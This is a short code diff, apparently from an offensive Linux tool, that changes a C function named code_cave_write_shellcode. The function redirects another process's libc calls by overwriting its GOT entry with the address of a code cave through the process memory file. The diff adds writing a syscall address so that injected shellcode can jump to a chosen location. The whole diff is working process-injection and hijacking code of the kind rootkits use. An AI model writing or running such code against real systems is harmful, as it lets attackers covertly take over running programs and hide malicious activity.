@@ -41,7 +41,7 @@ __u64 code_cave_find_address(int mem_fd, __u64 from, __u64 to, char flags[], __u
 }
 
 
-int code_cave_write_shellcode(int mem_fd, __u64 cave_addr, __u64 got_addr, __u64 malloc_addr, __u64 dlopen_addr){
+int code_cave_write_shellcode(int mem_fd, __u64 cave_addr, __u64 got_addr, __u64 malloc_addr, __u64 dlopen_addr,  __u64 syscall_addr){
     //Writing the code cave address in the GOT section, future calls to libc will be redirected
     size_t len = sizeof(__u64);
     __u64 buf_n = (__u64)cave_addr;
@@ -103,8 +103,18 @@ int code_cave_write_shellcode(int mem_fd, __u64 cave_addr, __u64 got_addr, __u64
             return -1;
         }
     }
+
+    //A trick to jump to a selected location
+    len = sizeof(__u64);
+    buf_n = (__u64)syscall_addr;
+    for(size_t ii=0; ii<len; ii++){
+        if(write(mem_fd, (void*)&buf_n+ii, 1) < 0 ){
+            perror("Error while writing syscall address");
+            return -1;
+        }
+    }
     
-    printf("Finished writing shellcode at %llx\n", cave_addr);
+    printf("Finished writing shellcode at %llx, syscall_addr %llx\n", cave_addr, syscall_addr);
     
     return 0;
 }
